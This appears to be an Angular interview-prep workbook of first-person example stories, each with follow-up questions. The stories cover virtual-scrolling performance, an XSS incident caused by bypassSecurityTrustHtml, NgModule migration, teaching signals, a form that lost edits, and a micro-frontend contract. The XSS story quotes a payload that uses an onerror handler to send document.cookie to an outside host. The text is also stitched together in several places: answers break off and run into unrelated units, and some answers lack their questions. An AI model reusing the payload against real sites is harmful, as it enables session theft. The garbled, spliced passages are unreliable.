For DOM cost, CDK virtual scrolling with a fixed row height renders roughly the 40 rows in the viewport plus a small buffer, so the node count stopped scaling with the data. Time to first render went from nineteen seconds to about 180 ms and memory settled around 120 MB. For change-detection cost, the row component takes a single signal-backed input and reads only from it; on Angular 22 that is the default (OnPush), but the important part is that it is genuinely leaf-shaped — a row that reaches into a service to look something up is checked whenever that service changes, and the strategy will not save you. For update cost, the honest answer is that 400 messages a second is far more than any human can read, so I stopped treating each message as a render: incoming ticks go into a plain Map outside Angular, and a single requestAnimationFrame loop drains the batch into signals once per frame. // the feed writes to a plain Map with no reactivity; one frame-batched flush into signals
export class PositionFeed {
  private readonly zone = inject(NgZone);              // still useful even in zoneless apps
  private readonly pending = new Map<string, Tick>();
  private scheduled = false;
  readonly rows = signal<ReadonlyArray<Position>>([]);

  private onMessage(tick: Tick) {
    this.pending.set(tick.id, tick);                   // last write wins per instrument
    if (this.scheduled) return;
    this.scheduled = true;
    requestAnimationFrame(() => this.flush());
  }

  private flush() {
    this.scheduled = false;
    const next = applyTicks(this.rows(), this.pending); // one new array per frame
    this.pending.clear();
    this.rows.set(next);                               // exactly one notification per frame
  }
}

(d) Follow-up drill chain

Why not just page the data?

Because the job was scanning, not looking things up. Traders read the whole book to spot outliers, and a page boundary hides exactly the comparison they are making; the first prototype had paging and the feedback was that it was unusable, not slow. That is a product constraint, and I would rather absorb engineering complexity than break the task. Where paging is right is when users arrive with a specific question — a search, a filter, an id — and I would push hard for it there, because it is dramatically simpler and it scales without limit. The design question is not "how much data" but "does the user scan or seek".

You batch to one frame. What happens if a single frame's work exceeds 16 ms?

You drop frames, and the batching quietly becomes a queue — which is exactly the failure I watched for. Our worst frame was the first one after a sort, and that is why sorting went to a worker. The general defence is to keep the per-frame work proportional to what is visible rather than to what changed: we apply ticks to the underlying map for everything, but only the roughly 40 visible rows produce bindings, so a burst affecting 12,000 instruments costs about the same as one affecting 40. If a frame still overruns, the honest options are to render less (fewer columns, simpler cells) or to accept a lower update rate for off-screen state. What you must not do is let the pending map grow unbounded — we cap it and drop the oldest tick per instrument, since only the latest price matters.

At what scale does this design break?

Two independent walls. On rows, virtual scrolling holds to hundreds of thousands, but the scrollbar becomes useless and the sort moves from 40 ms to seconds even in a worker, so past roughly 100,000 I would move sorting and filtering to the server and stream a window. On update rate, we are fine to a few thousand messages a second because the flush cost is bounded by the viewport; the wall there is the websocket and JSON parsing on the main thread, which starts to show around 5,000 messages a second and is fixed by parsing in a worker or moving to a binary format. The wall I would hit first in practice is neither: it is columns. Eighteen columns of 40 rows is 720 cells per frame; at 60 columns the per-frame binding cost alone eats the budget, and the answer becomes column virtualisation, which is considerably nastier than row virtualisation.

What did you trade away?

Find-in-page and print, both of which we rebuilt at real cost; accessibility, which needed explicit work because a virtual viewport lies to screen readers about set size unless you set aria-rowcount and the per-row index yourself; and simplicity — a junior engineer cannot casually add a column to this grid any more, because the row height is load-bearing and the cell must be cheap. I wrote that constraint at the top of the component file. The trade I refused was canvas rendering, which would have been faster and would have cost us selection, copy, accessibility and every browser affordance at once; the performance was not the binding constraint, so paying that price would have been optimisation as vanity.

How did you verify 60fps rather than assert it?

Two ways, because a demo on a fast machine proves nothing. In the browser, a performance recording during a scripted 30-second burst, reading dropped frames and long tasks directly rather than watching it look smooth. In CI, a headless run replaying a captured feed at 400 messages a second with the frame timings collected via the browser's performance APIs, asserting that the 99th-percentile frame stays under 16 ms — that runs nightly and it has caught two regressions since, both of them someone adding a computed column that was not cheap. The number I actually report to the business is neither: it is that no trader has filed a lag complaint in eleven months, which is the only measure that ultimately matters.

Would you build this on Angular 22 the same way?

Mostly yes, with two changes. I would start zoneless — the default for new apps since v21 — because it removes the entire class of accidental ticks from third-party code and makes the frame-batching design the only scheduler, which is exactly what you want here; with zones we had to be careful to run the websocket handler outside Angular and that subtlety just disappears. The commit that introduced it was eighteen months old and its message said "fix: bold and links not rendering in comments". That is how nearly every real XSS in an Angular application happens — not by disabling security, but by using the escape hatch that is named as though it were the solution.

The mechanism is worth stating precisely, because Angular's defaults are genuinely good and the exception is narrow. Angular treats all values as untrusted by default and applies contextual escaping: interpolation escapes into text, and [innerHTML] runs the value through the DOM sanitizer, which strips <script>, event-handler attributes such as onerror, and javascript: URLs. bypassSecurityTrustHtml switches that off for the value you pass, permanently, for that value. So the comment body — stored in our database, rendered to every other user who opened the case — went to innerHTML with no filtering at all. I confirmed it in staging with the most boring payload in existence, <img src=x onerror="fetch('https://x/'+document.cookie)">, and it fired.

(d) Follow-up drill chain

What exactly does Angular sanitize, and what does it not?

Angular applies contextual escaping to values that reach the DOM through its bindings. Interpolation escapes into text so markup can never be created. [innerHTML] runs the value through the DOM sanitizer in the HTML context, which drops <script> elements, event-handler attributes and javascript: URLs while keeping formatting markup. There are separate contexts for style, URL and resource URL — a resource URL such as an iframe src cannot be sanitized at all, which is why Angular refuses it outright rather than filtering it. What it does not cover is anything that leaves the framework: your own element.innerHTML = value, a third-party library that injects markup, templates built by string concatenation on the server, or a URL you hand to location.assign. Those are the places I look first in any review, because the framework's guarantee ends exactly where you stop using its bindings.

Is there ever a legitimate use of bypassSecurityTrustHtml?

Yes, and being able to name one is what separates understanding from cargo-culting the ban. It is legitimate for content you fully control and that Angular's sanitizer would strip incorrectly — an SVG icon set compiled into the bundle, or markup produced by a template engine you own and that never touches user input. The rule I would defend is not "never" but "never on a value derived from input, and never outside one reviewed module". In our codebase there is exactly one such module, every call in it takes a compile-time constant, and the lint rule allows that file and nothing else. If someone needs a second one, that is a conversation rather than a commit.

A CSP would have blocked your proof of concept. Is a CSP enough on its own?

No — it is the second layer, not the first. A strict policy without unsafe-inline blocks inline event handlers and inline scripts, which stops the most common payloads, but it does not stop everything: injected markup can still deface a page, phish for credentials with a convincing form, or exfiltrate via an allowed origin if your policy is loose about connect-src or img-src. A CSP is also easy to weaken accidentally — one third-party widget that needs unsafe-inline and the protection is gone for the whole document. So I treat it as defence in depth that buys you time and reduces severity, on top of a codebase where the sanitizer is never bypassed. Trusted Types, where the browser supports it, is the stronger version of the same idea because it enforces the rule at the DOM sink rather than at review time.

How did you determine whether it had actually been exploited?

We could partly answer it and I said so plainly rather than reassuring anyone. We scanned every stored comment body for markup that the sanitizer would strip — script tags, event-handler attributes, javascript: URLs — and found eleven rows, all of them pasted formatting from Word with no handlers. We did not have the ability to prove nothing had been injected and later deleted, because we had no history on that column, and that gap went into the report as its own finding. The remediation included retaining an audit trail on user-generated content, which is the sort of unglamorous follow-up that only gets funded in the two weeks after an incident, so I made sure it was in the report while the attention lasted.

How would you make sure the team actually learns from this rather than just complying?

By making the rule explain itself at the moment it fires. Our lint rule's message is one sentence saying that Angular already sanitizes [innerHTML] and that this API disables it for other users' browsers, with a link to the internal write-up — a rule that just says "forbidden" teaches nothing and gets suppressed. Beyond that I ran a 20-minute session where we walked the actual commit and I asked the team what they would have done with that original bug, which surfaced that three other people would have reached for the same fix. That was the useful outcome: it made it visibly a system problem rather than one person's lapse, which is both true and what makes people comfortable reporting the next one.

What is the equivalent trap in an SSR Angular application?

State transfer and anything rendered server-side outside a template. When Angular renders on the server it serialises the transfer state into the HTML document, and if you put user-controlled data in there without encoding it correctly you have injected into a script context, where the HTML sanitizer is irrelevant. The same goes for index.html tokens replaced at request time, meta tags built from query parameters, and any error message echoed into the page. On top of that, SSR means user data is now handled by a Node process, so server-side template injection and SSRF join the threat model. The mental shift I coach is that the sanitizer protects the client-side binding path only — the moment content reaches HTML by another route, you own the encoding.

09Deleting the last NgModule

EXAMPLE — replace with your own

Standalone components arrived in Angular 14 as a developer preview, became stable in v15, and became the default for generated code in v19. We were carrying 61 NgModules through the upgrade described in unit 04, and the automated migration handled most of them — but "most" is where the story is. The schematic converts components to standalone, moves their dependencies into imports, and deletes modules that no longer do anything. It cannot make a decision, and about a dozen of our modules existed to encode a decision.

The interesting ones were all about dependency injection scope, because that is the one real thing NgModules did that standalone components do not do by themselves. We had a ReportingModule with a providers array giving every component inside the reporting area its own ReportCacheService instance, so that leaving the area threw the cache away. Convert the components naively to standalone and that service becomes either a root singleton — the cache now lives forever and users see stale reports from a session they left an hour ago — or a per-component instance, which means six copies of the cache and six times the fetches. Neither is what the module meant. The correct translation is route-level providers: attach the provider to the lazy route that owns the feature, and the injector lives exactly as long as the activated route.

// before: a feature module whose real job was scoping a provider
@NgModule({
  declarations: [ReportListComponent, ReportDetailComponent],
  imports: [CommonModule, ReportingRoutingModule],
  providers: [ReportCacheService],        // one instance per module load
})
export class ReportingModule {}

// after: the scope moves to the route, which is where the lifetime actually lives
export const REPORTING_ROUTES: Routes = [
  {
    path: '',
    providers: [ReportCacheService],      // one instance for this activated route subtree
    children: [
      { path: '', loadComponent: () => import('./report-list.page').then(m => m.ReportListPage) },
      { path: ':id', loadComponent: () => import('./report-detail.page').then(m => m.ReportDetailPage) },
    ],
  },
];

The second category was forRoot. Two of our internal libraries used the forRoot/forChild pattern to accept configuration, which in a standalone world becomes a provider function returning EnvironmentProviders — the same shape Angular itself now uses for provideRouter, provideHttpClient and the rest. Rewriting those was mechanical once someone had done the first one, so I did the first one in a pairing session with the two engineers who would do the rest, which cost an afternoon and saved a week of me answering questions. The third category was the one I got wrong: three modules existed purely as a bag of re-exported common imports (SharedModule, imported by everything). The migration converted it to a standalone component array that every component imported, which is technically standalone and behaviourally identical to the old module — including the part where it defeated tree-shaking, because importing the bag pulls in all of it. Deleting the bag and letting each component import exactly what it uses is what actually produced the bundle win, and no codemod will do that for you.

The results were smaller than the effort suggests and I say that openly, because tech-debt stories that claim transformational numbers are the ones interviewers distrust. What I would do differently: I would have separated the mechanical commit from the judgment commits ruthlessly. After that, the rule was that codemod output goes in one commit, untouched, and every human decision is a separate commit with a sentence saying what the module used to mean. Reviews went from an hour of skimming to ten minutes of actual reading.

(d) Follow-up drill chain

What did NgModules actually give you that standalone components do not?

One real thing and one accidental thing. The real one is a DI scope with a lifetime attached to something other than the root or a component — a set of providers instantiated when the module was loaded and shared by everything inside it. In standalone Angular that role is filled by route-level providers, and the injector's lifetime becomes the activated route, which is usually what people meant anyway. The accidental one is a shared compilation context: because a module declared what its components could see, you could import once and use everywhere, which is convenient and is exactly what made dependency graphs impossible to tree-shake. Standalone trades that convenience for explicitness — each component lists what it uses, which is more typing and dramatically better for bundling and for reading an unfamiliar file.

Route-level providers versus providedIn: 'root' — how do you decide?

By asking when the state should die. providedIn: 'root' means one instance for the application's lifetime, which is right for anything genuinely global — auth, configuration, an HTTP wrapper — and wrong for anything holding data about a thing the user is currently looking at, because that data then survives the user navigating away and comes back stale. Route providers give you an instance per activated route subtree, destroyed on navigation away, which is the correct lifetime for a feature cache, a wizard's state, or a per-entity store. Component-level providers are for state that belongs to one instance of one component. The failure I see most often is a root singleton holding per-entity state, guarded by a manual reset() call that someone eventually forgets — the lifetime should do that work, not a method.

At what point would you have stopped and left the modules alone?

If the mechanical part had not covered the large majority. The economics only work because a codemod does 80% for free and the human effort is bounded to a dozen real decisions; if the ratio had been reversed — say a codebase full of dynamic module loading, or a heavily module-based third-party library with no standalone story — I would have stopped after the bootstrap and the leaf components and left the feature modules in place indefinitely. Angular still supports them, so this is debt you can carry. I would also have stopped if it had needed its own budget: this was affordable because it rode along with an upgrade the business had already agreed to, and I would not have spent political capital asking for two months to delete a concept users cannot see.

What did you trade away?

Explicitness costs typing: every component now lists its imports, so adding a shared pipe means touching every file that uses it rather than one module. That is a real daily cost and the team felt it for about a month before the tooling caught up with them. We also lost a genuine convenience in tests, where a testing module used to give you a whole feature's dependencies in one line; the standalone equivalent is more verbose, and I could not make that go away, only reduce it with test helpers. And I accepted a period of inconsistency — for four months the codebase had both shapes, which is confusing for a new joiner and is exactly the ambiguity story 02 is about. It was worth it, but I would not describe it as free.

How did you know you had not broken a provider scope subtly?

Mostly by tests, and partly by admitting that the tests were weak in exactly this area. Provider scope failures are quiet — the wrong instance is still an instance, so nothing throws; you just get stale data or a duplicated fetch. So for each of the dozen scoped modules I wrote a test asserting the lifetime rather than the behaviour: navigate into the feature, capture the instance, navigate away and back, assert it is a different instance. Those tests did not exist before and they caught two mistakes. It is the pattern I would repeat anywhere a refactor changes lifetimes rather than logic — assert the lifetime explicitly, because no existing test is looking at it.

What would you do first on Angular 22 if you inherited this codebase today?

The same sequence, but I would exploit two things v22 added. @Service() replaces @Injectable({ providedIn: 'root' }) with less ceremony, so the root-scoped services get shorter without changing behaviour — a cosmetic win, applied as a codemod, in its own commit. More interestingly, injectAsync() lets a service be loaded lazily with an optional prefetch, which is the missing piece for feature code that was only eager because a module imported it; a few of our heavier services (charting, export) are now behind that and it took another 90 kB off the initial bundle. But I would still do the scoping work first, because a lazily-loaded service with the wrong lifetime is the same bug arriving later.

10Teaching a team to think in signals

tier · principal mentoring / levelling up

EXAMPLE — replace with your own

Six months after we adopted signals, the code was full of them and almost none of it was reactive. People had done a find-and-replace on their mental model: a field became a signal(), reading it gained parentheses, and everything else stayed the same. The tell was effect(). We had 47 of them, and roughly 40 were doing what a computed() should do — read two signals, calculate a third, write it back into another signal. That pattern is not a stylistic problem; it is a correctness problem, because it creates a second source of truth that is updated a tick late, and it produces exactly the class of bug where a value is right after you click twice.

I could have written a lint rule and moved on, and I did eventually, but the rule would have taught nothing. The gap was conceptual: the team was thinking in events — "when this changes, do that" — and signals want you to think in derivations — "this value is defined as a function of those values". That is genuinely a different way of holding a program in your head, and it is not obvious from the API surface, which is why the find-and-replace happens. It is also, I noticed, the same shift that trips people moving from imperative DOM updates to declarative templates, so several of the team had made it once already without having a name for it.

What worked was three things, in this order. First, a name and a rule of thumb, delivered in ten minutes at a team meeting rather than a document: if you are writing to a signal inside an effect, you probably wanted computed; an effect is for talking to the world outside Angular — logging, analytics, localStorage, a chart library, document.title. Second, I took the 47 effects and classified them publicly in a shared document, with the four legitimate ones at the top and my reasoning for each; making the good examples visible mattered more than condemning the bad ones. Third — the thing that actually moved the needle — I stopped answering design questions with answers and started answering them with the question "what is this value a function of?". Within about six weeks I was hearing engineers ask each other that.

// what the team wrote: an effect maintaining a second copy of the truth
readonly items  = signal<Item[]>([]);
readonly filter = signal('');
readonly visible = signal<Item[]>([]);      // a second source of truth

constructor() {
  effect(() => {
    this.visible.set(this.items().filter(i => i.name.includes(this.filter())));
  });                                       // runs after the fact; can glitch; hard to test
}

// what it should be: one definition, evaluated lazily, always consistent
readonly items   = signal<Item[]>([]);
readonly filter  = signal('');
readonly visible = computed(() => this.items().filter(i => i.name.includes(this.filter())));

// what effect() is genuinely for: the world outside Angular
constructor() {
  effect(() => localStorage.setItem('filter', this.filter()));
}

The individual case I remember best was an engineer three years in, very capable, who was frustrated because a piece of UI was "one click behind". She had a chain of three effects, each writing a signal the next one read, and the value was correct only after an extra change-detection pass. We debugged it together and I deliberately did not tell her the answer; I asked her to draw the dependencies on a whiteboard. She drew the arrows, looked at it, and said "this is a graph, and I've made it a queue". That sentence became team vocabulary. Six weeks later she gave the internal talk on signals, which was the outcome I wanted — not that she understood it, but that the explanation stopped depending on me.

(d) Follow-up drill chain

Why is writing to a signal inside an effect actually wrong, not just untidy?

Because it creates a derived value that is not derived — a second source of truth updated after the fact. A computed is lazy and glitch-free: it recalculates when read, after all its dependencies have settled, so no consumer can ever observe an intermediate state. An effect runs as a scheduled side effect, so between the source changing and the effect running there is a window in which your two signals disagree, and if another effect reads the stale one you get a cascade that resolves a tick later — which is exactly the "one click behind" symptom. It is also harder to test, because you need the scheduler to have run, and harder to reason about, because the dependency direction is invisible at the definition site. Angular reflects this in the API by making writes inside effects awkward on purpose.

Then when is an effect the right answer?

When the destination is outside Angular's reactive graph and therefore cannot be a computed: persisting to localStorage, sending an analytics event, updating document.title, pushing state into a non-Angular library such as a map or a chart, or logging. The test I give people is "does anything in Angular read the result?" — if yes, it is a derivation; if no, it is an effect. Our four legitimate ones were a localStorage write, a chart library update, a scroll-position restore and a debug logger, and every one of them ends at a boundary. I would add that if you want a derived value that is also writable and resets when its source changes, linkedSignal() is the primitive people usually reach for an effect to fake.

Why not just add the lint rule on day one and skip the teaching?

Because a rule changes the code and not the thinking, and the thinking is what produces the next bug. People route around rules they do not understand — the predictable outcome would have been 40 effects with suppression comments, or the same logic moved into a method called from an effect, which the linter cannot see. I did add the rule, about two months after the session, and by then it was uncontroversial because it encoded something the team already believed; it fires perhaps twice a quarter now and each time it is a genuine catch. The sequencing is the point: automate a norm after it exists, not to create one. A rule imposed first reads as distrust and gets treated as an obstacle.

How do you know the change stuck rather than people performing for you?

The evidence I trust is behaviour when I am not involved. Effect count across the codebase went from 47 to 6 over four months, but more convincingly the reduction happened in pull requests I did not review — I checked deliberately, because a metric that only moves in code I touch is measuring my reviews, not the team. The second piece was hearing the question asked in a design discussion I was not part of and only heard about afterwards. And the third is the talk: she prepared it without my input and got two things sharper than my version. If none of those had happened I would have concluded I had a compliance culture rather than an understanding one, which is a worse problem than the original.

What would you do with someone who did not change?

Find out which of three things it is, because the responses are different. If they disagree on the merits, that is a conversation I want — twice in my career someone pushing back on a convention has been right, and shutting that down costs more than the convention is worth. If they understand and keep forgetting, that is a tooling problem and the lint rule solves it without any interpersonal content at all. If they are not engaging, that is a performance conversation and it belongs with their manager, privately, with specifics — and I would have it early rather than let a team norm quietly become optional, because the cost of an unenforced standard falls on everyone who follows it.

How does this scale beyond one team?

Badly, if the mechanism is me in a room, which is the honest limit of the story as told. Across an organisation the things that travel are artefacts, not conversations: a short written explanation with the whiteboard drawing in it, the lint rule with a message that teaches, and a worked example in the shared component library that people copy. The other lever is deliberately not being the author — I asked the engineer who had the insight to give the talk partly because a peer explaining it lands differently from a principal explaining it, and it travels to teams I have no relationship with. I would measure it the same way at any scale: is the vocabulary showing up in places I have never been?

How did you decide which nine components made the cut?

By coverage, measured rather than argued. What if the director had picked option one and borrowed the engineers?

Then I would have implemented it properly rather than sulking, and I would have said clearly, once, in writing, what I expected to go wrong — that two engineers joining a component library at week five would cost us more in ramp-up and review than they added before the date, and that the other team's missed commitment was a real cost being paid to a different budget. At what point does "cut scope" stop being available?

When the remaining scope is a single indivisible thing, or when what you are cutting has already been promised externally. Both were live here: below nine components there is no coherent rebrand, so the floor was real; and if the marketing site had listed features rather than a launch date, the cut would have been a broken commitment rather than an internal trade. The other place it disappears is compliance and security deadlines, where the requirement is binary. In those cases the honest options shrink to more people, more time, or a smaller promise, and the job becomes making sure the person who owns the promise knows early enough to change it. What is never available is cutting the rigour on what does ship — that is not a scope cut, it is a loan at a very high interest rate.

A quarter of visible inconsistency — 55 components in the old styling next to nine in the new, which designers found genuinely painful and mentioned in every review. I underestimated that cost; it is easy to say "low-traffic screens" when you are not the person whose work looks unfinished. We also shipped without theming, which meant that when a real second brand appeared eight months later we paid for retrofitting it, and that retrofit was more expensive than building it in would have been. I would still make the same call, because the second brand was hypothetical at the time and the launch was not, but I would not pretend the deferred cost was zero — YAGNI is a good default and it is not free.

By fixing the definition of done before the pressure arrived, so it could not quietly erode. When week eight got tight, the conversation was about which components ship rather than which checks we skip, because the checks were part of what "a component" meant. That is the mechanism I would carry anywhere: define done early, cut count later. Yes, but for a different reason than the one in the original pitch. The pitch was consistency and speed, and the speed argument was weak — a team that owns its own components moves faster in the short run, and the library only pays for itself once you count the fourth team implementing the same modal. What actually justified it was accessibility and behaviour: getting focus management, keyboard interaction and screen-reader semantics right once, in a component with tests, rather than four times approximately. I would lead with that argument next time, because it is the one that survives scrutiny, and because it is the one nobody can achieve by copying a stylesheet.

12The form that silently ate people's edits

EXAMPLE — replace with your own

A caseworker rang support to say she had typed a 400-word assessment, clicked Save, seen the green toast, and found the field empty when she reopened the case an hour later. That is the worst class of front-end bug: the user did everything right, the system told them it had worked, and the data is gone. There was no error anywhere — not in the browser console, not in the API logs, not in our error tracker — because from the system's point of view nothing had failed.

Reproducing it took two days and the shape of the reproduction was the answer. It only happened when the user edited the assessment field and then, before saving, expanded a collapsed section further down the form. That section contained a nested form group built with a *ngIf-equivalent block, and the parent form was rebuilt when the section opened — this.form = this.fb.group({...}) in the handler, because whoever wrote it needed the new controls to exist and reassigning the whole group was the shortest way to get there. Rebuilding the group discards the current values of every control in it and repopulates from the last loaded server state. The template rebinds to the new group instantly, so the textarea repaints with the old text; the user had already scrolled past and never saw it. Save then submitted the old value, honestly and successfully.

The immediate fix was to add the nested controls rather than rebuild the group — form.addControl() with the existing values preserved — which is four lines and took an hour including the test. The rest of the week went on the two questions that actually mattered: how much data had we lost, and how do we make this class of failure loud instead of silent. For the first, we could partially answer it: the API stored a revision history, so I could find assessments where a revision was followed by a revision with an older-looking body, and we identified 34 cases across five months. Support contacted all 34 users. Eleven had noticed and retyped, four had lost work they could not reconstruct, and the rest had not noticed, which is the number I found hardest to sit with.

The prevention work was three layers and I would argue the third is the one that matters. That test would have caught it. And the durable one: autosave a draft to local storage on a debounce, keyed by case id and user, restored with a visible "you have unsaved changes from 14:32 — restore?" prompt. That does not prevent the bug; it makes the class survivable, which is the right ambition, because there will be another way to lose a form's contents and I would rather not find out what it is by losing someone's afternoon.

(d) Follow-up drill chain

Why did no error surface anywhere?

Because nothing failed. Rebuilding the form group is a legal operation; the new group was correctly constructed, the template correctly rebound to it, the save correctly submitted the values the group held, and the API correctly stored them. Every layer did its job on data that had already been replaced. That is the defining property of the silent-failure class: there is no exception to catch, because the loss happened as a normal state transition rather than as an error. It is also why monitoring cannot find these — you can only detect them by asserting an invariant that nobody thought to write down, in our case "a value the user typed is still there after any UI interaction". Now it is a test.

Why not just autosave to the server continuously and avoid the whole problem?

Because it moves the risk rather than removing it, and for this domain it introduces a worse one. A partly-written assessment saved to the server is a legally meaningful record in a case file that other people read, and caseworkers were explicit that they did not want half-formed judgments visible to colleagues; that is a domain constraint, not a technical preference. Server autosave also needs conflict handling the moment two people open the same case, which is real work. A local draft keeps the safety net without changing what "saved" means, and the restore prompt puts the user in control of promoting it. I would choose server-side drafts for a document editor where collaboration is the point, and local drafts for a record with a formal save semantic — the distinction is whether an intermediate state has meaning to anyone but the author.

At what point does the local draft mechanism itself become a liability?

Two ways, and we hit the first. Stale drafts: a user restores something from three weeks ago because the prompt does not make the age obvious, and now they are editing a version that predates someone else's changes — we added the timestamp to the prompt and a seven-day expiry after exactly that. The second is data protection: localStorage is unencrypted, shared across every page on the origin, and survives logout, so on a shared machine one caseworker's draft assessment is readable by the next person to sit down. We clear drafts on logout and key them by user id, and I would think much harder before using this pattern for anything more sensitive than free text — for genuinely confidential content the honest answer is a server-side draft with the same access control as the record.

What did you trade away?

Complexity in every form component, which is a real ongoing cost — the draft mechanism is a behaviour people have to know about, and it produced two subsequent bugs of its own, both of them restore-prompt edge cases. We also introduced a small user-facing annoyance: the deactivate guard's dialog fires on forms where the dirty state is trivial, and people learn to dismiss dialogs, which slightly devalues every future confirmation we show them. If I were tightening it now I would make dirtiness meaningful rather than boolean — warn only when there is content worth losing — because a guard that cries wolf is a guard nobody reads.

How did you decide to contact the users rather than quietly fix it?

It was not really a decision for me alone, and that is part of the answer: I brought the impact numbers to my manager and to the service owner the same afternoon I had them, because "how many people did we harm" is not an engineering call. My recommendation was to contact all 34, including the nineteen who had not noticed, on the grounds that a case file with silently wrong content is a problem regardless of whether anyone spotted it. There was a genuine argument for only contacting the ones with unrecoverable loss, and I did not think it was mad — it just weighted embarrassment above accuracy. What I would insist on in any version of this conversation is that engineering supplies the honest number early enough for the choice to be real.

Would Signal Forms have prevented this?

Probably, though I want to be careful not to sell a version number as a fix for a design mistake. Signal Forms, stable since Angular 22, model a form as a structure over signal-held state rather than as an object graph you own and can reassign, so the shortcut that caused this — replacing the whole group to add fields — is not the natural thing to reach for; the shape of the API pushes you towards the state being the source of truth and the form being a view over it. What it would not prevent is the more general mistake of resetting state on a UI event, which you can do in any framework. So my honest answer is that it removes this particular foot-gun and that the test asserting typed values survive interaction is still the thing I would not give up.

Why @defer rather than just lazy-loading a route per panel?

On v22 I would pair it with @boundary for runtime failures after load, since @error covers the load and not the rendering. Routes would have given me none of that and would have forced a navigation model onto something that is one screen.

With one team and a panel taking an afternoon to add, that investment buys nothing but abstraction. Writing the trigger down is what stops "we'll do it later" from meaning "never" or "the moment someone gets bored".

Coherence, mostly. A dashboard grown panel by panel from observed demand looks like exactly that — fourteen good panels and no design. 14The micro-frontend contract we had to write

EXAMPLE — replace with your own

Our Angular application was one of five remotes inside a host shell owned by a platform team in a different timezone. The shell provided authentication, navigation and a shared layout; we provided the billing area. It worked until it did not, and the way it broke is the interesting part: the platform team upgraded the shell to a newer Angular major on a Thursday, our remote was still built against the previous one, and the shared singleton for the auth service resolved to two different instances. Users were signed in according to the shell and signed out according to us. There was no error, no failed build, and no test anywhere that could have caught it, because the failure only exists when two independently-built artefacts meet at runtime.

The root cause was organisational and I want to be precise about that, because the temptation is to describe it as a webpack or Native Federation configuration problem. The technical fact is that module federation shares libraries at runtime by version range, and a singleton is only a singleton if both sides agree on a compatible version; if they do not, you get two copies and Angular's dependency injection has no idea. But the reason nobody noticed is that five teams shipped independently against a contract that existed only as folklore — "keep your Angular version in step with the shell" — with no mechanism to enforce it and no shared calendar for major upgrades.

I could not fix the platform team's process and I did not try. What I could do was make the contract explicit, testable and visible, and offer it rather than demand it. I wrote a two-page document that said exactly four things: which packages are shared singletons and at what version range, what the shell guarantees to provide (auth, routing base, a design-token stylesheet), what a remote must not do (register global styles, navigate the top-level router directly, patch window), and the notice period for a breaking change. Then I did the thing that made it real — I built a contract test. A small suite that boots the shell and each remote together in CI and asserts the singletons are actually singletons, the auth token propagates, and the remote mounts and unmounts cleanly. It runs on every shell change and every remote change, and it caught the next version drift eleven days before it would have reached production.

// the assertion that would have caught the original incident: one instance, not two
it('shares a single auth service instance across shell and remote', async () => {
  const shell  = await bootShell();
  const remote = await shell.mount('billing');

  expect(remote.injector.get(AuthService))
    .toBe(shell.injector.get(AuthService));      // fails if federation gave us two copies
});

// and the version agreement, asserted rather than assumed
it('shares @angular/core as a strict singleton', () => {
  const shared = readFederationConfig('./federation.config.js').shared;
  expect(shared['@angular/core']).toMatchObject({ singleton: true, strictVersion: true });
});

The social half mattered more than the test. I took the document to the platform lead as a draft with an explicit invitation to change it, not as a specification to sign, and the first version came back with three of my four sections rewritten — which was the point, because he then owned it. We agreed a shared upgrade calendar: the shell announces a major version bump four weeks ahead, remotes have two weeks to be ready, and the shell does not ship until the contract tests pass for all five. That last clause was the hard one to negotiate and it was the one that actually prevented recurrence, because it converted "please keep up" into a gate that fails loudly. Eighteen months on, we have had two Angular majors go through with no incident.

(d) Follow-up drill chain

Why did the shared singleton produce two instances rather than an error?

Because module federation resolves shared dependencies at runtime by matching version ranges, and its default when the ranges do not overlap is to fall back to each side's own copy rather than to fail. That is a reasonable default for a leaf library and a disaster for anything holding state, because Angular's injector in the remote then resolves against a different InjectionToken identity from the shell's — same name, different module instance, no relationship. Setting singleton: true with strictVersion: true converts that silent divergence into a startup error, which is what we did; the cost is that a genuine mismatch now takes the page down instead of behaving strangely, and I will take a loud failure over a quiet one every time.

Would you choose micro-frontends again for this?

Honestly, no — not in this shape. Five teams all writing Angular, sharing an auth singleton, coordinating major upgrades on a calendar, and gating each other's releases through a shared contract test: that is the coupling of a monolith with the operational overhead of five deployments. The case for micro-frontends is independent deployment and independent technology choice, and we had neither in practice. What I would advocate for is either a monorepo with one deployable and clear internal boundaries, which is what the situation actually was, or genuine independence via web components with nothing shared but a design-token stylesheet, accepting the bundle duplication as the price of the autonomy. Choosing the middle is how you get both sets of costs.

At what number of remotes does the contract-test gate stop working?

It degrades in two directions. Time: booting five shell-plus-remote combinations takes about four minutes, and it is linear, so at twenty remotes the shell team waits twenty minutes on every change, which is where people start skipping the gate. Coordination: with five teams, "the shell does not ship until everyone passes" is negotiable; at twenty, one lagging team blocks the platform indefinitely and the gate will be removed within a quarter, correctly. The scaling answer is to invert it — the shell publishes a versioned contract, remotes test against the published contract independently, and the shell ships when a quorum passes with the laggards pinned to the previous shell version. That needs the shell to support two versions concurrently, which is real work and is exactly the cost of genuine independence.

What did you trade away?

Release independence, which was supposedly the whole point of the architecture — we made the coupling explicit, and explicit coupling has a schedule attached. Our team now cannot upgrade Angular when we like; we upgrade when the calendar says, which has twice meant sitting on a version we wanted for six weeks. I think that is the right trade because the alternative was the same coupling with the consequences arriving at runtime, but a certain kind of engineer hears "we added a gate between five teams" as bureaucracy, and they are not entirely wrong. The mitigation is that the gate is fast and automated: it costs four minutes, not a meeting.

How did you get the platform lead to accept a gate on his own releases?

By making the incident his problem before it was his obligation — not rhetorically, but factually: the outage was attributed to the shell in the incident review, and he was already looking for a way to stop that recurring. I brought the gate as the answer to a question he had rather than as a constraint I wanted, and I brought it with the test already written and running in our pipeline, so the ask was "run this" rather than "build this". The other thing that mattered was giving up authorship: I sent a draft, he rewrote most of it, and the document has his name on it. If the goal is adoption rather than credit, that is a very cheap thing to give away.

What would you do if the platform team had simply refused?

Defend our own boundary and make the failure visible rather than escalate. Concretely: pin our remote to a shell version, run the contract test against the shell's latest nightly so we find drift before their release rather than after, and add a runtime assertion at mount that logs loudly and shows a degraded state if the auth singleton is not shared — so if it happens again, it is diagnosed in seconds rather than hours. Then I would publish the incidents. Not as a complaint, but as data in a place leadership sees, because a recurring cross-team failure that only ever costs one team is an incentive problem, and incentive problems get fixed by making the cost visible where it can be acted on. Escalating without that evidence just makes you the person who complains.

15The SSR project I cancelled

tier · principal a project that failed or was cancelled

EXAMPLE — replace with your own

I approved it, I championed it, and I killed it eleven weeks in. The proposal was to add server-side rendering to a customer-facing Angular application: better first-load performance, better SEO on the public pages, and a marketing team that had been told by an agency that our pages were "invisible to Google". I signed it off on the strength of the argument rather than the evidence, which is the mistake the whole story turns on.

